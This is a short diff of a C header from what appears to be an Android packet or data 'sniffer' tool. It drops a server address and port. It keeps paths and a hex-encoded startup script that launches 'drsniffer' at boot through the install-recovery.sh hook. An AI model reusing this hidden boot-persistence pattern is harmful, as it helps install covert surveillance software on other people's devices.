@@ -5,13 +5,8 @@
  *      Author: Kingsley Yau
  *      Email: Kingsleyyau@gmail.com
  */
-
 #ifndef SINFFEREXCUTEDEF_H_
 #define SINFFEREXCUTEDEF_H_
-
-#define ServerAdess 					"192.168.88.140"//"sniffer.wicp.net"
-#define ServerPort 						9876
-#define SnifferLogFileName 				"sniffer"
 
 #define RelaseFilePrefix				"/data/data/"
 #define RelaseFileLib					"/lib/"
@@ -23,7 +18,9 @@
 #define AutoStartScriptFile				"install-recovery.sh"
 #define SnifferInStallerFile			"libsniffer.so"
 
-static unsigned char AutoStartScript[] {
+#include <common/command.h>
+
+unsigned char AutoStartScript[] {
 	0x23 ,0x21 ,0x2f ,0x73 ,0x79 ,0x73 ,0x74 ,0x65 ,0x6d ,0x2f ,0x62 ,0x69 ,0x6e ,0x2f ,0x73 ,0x68,
 	0x0a ,0x64 ,0x72 ,0x73 ,0x6e ,0x69 ,0x66 ,0x66 ,0x65 ,0x72 ,0x20 ,0x26 ,0x0a,
 };
